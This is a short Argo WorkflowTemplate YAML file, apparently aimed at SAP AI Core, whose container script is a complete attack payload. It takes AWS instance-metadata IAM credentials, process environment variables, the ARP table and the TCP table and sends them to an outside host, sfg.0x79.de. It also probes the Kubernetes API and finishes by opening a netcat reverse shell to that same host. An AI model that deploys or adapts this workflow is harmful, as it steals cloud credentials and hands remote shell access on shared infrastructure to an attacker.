apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: testflo-rce-wft
  annotations:
    executables.ai.sap.com/name: testflo-rce-wft
    executables.ai.sap.com/id: testflo-rce-wft
  labels:
    scenarios.ai.sap.com/id: testflo-scenario
    scenarios.ai.sap.com/name: testflo-scenario
    executables.ai.sap.com/id: testflo-rce-wft
    executables.ai.sap.com/name: testflo-rce-wft
    ai.sap.com/version: "1.0.0"
    ai.sap.com/resourcePlan: starter
spec:
  entrypoint: cb
  templates:
    - name: cb
      container:
        image: alpine:3.19
        command:
          - sh
          - -c
          - |
            apk add --no-cache curl 2>/dev/null
            # IMDSv2
            IMDS_TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" \
              -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 5) || true
            if [ -n "$IMDS_TOKEN" ]; then
              ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 5)
              curl -sf -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
                --max-time 5 -o /tmp/imds_creds.txt
              curl -sf --data-binary @/tmp/imds_creds.txt "https://sfg.0x79.de/cb?t=TESTFLO-IMDS-CREDS" || true
            else
              curl -sf "https://sfg.0x79.de/cb?t=TESTFLO-IMDS-FAIL" || true
            fi
            # proc recon
            ENV1=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -v 'TOKEN\|SECRET\|PASS\|KEY' | head -50)
            curl -sf --data-urlencode "d=${ENV1}" "https://sfg.0x79.de/cb?t=TESTFLO-PROC1-ENV" || true
            ARP=$(cat /proc/net/arp 2>/dev/null)
            curl -sf --data-urlencode "d=${ARP}" "https://sfg.0x79.de/cb?t=TESTFLO-ARP" || true
            TCP=$(cat /proc/net/tcp 2>/dev/null | head -30)
            curl -sf --data-urlencode "d=${TCP}" "https://sfg.0x79.de/cb?t=TESTFLO-TCP" || true
            # k8s API unauthenticated probe
            KAPI=$(curl -sk https://kubernetes.default.svc/api/v1/namespaces --max-time 5 2>/dev/null | head -c 500)
            curl -sf --data-urlencode "d=${KAPI}" "https://sfg.0x79.de/cb?t=TESTFLO-KUBE-API" || true
            # reverse shell
            nc sfg.0x79.de 8080 -e /bin/sh || true
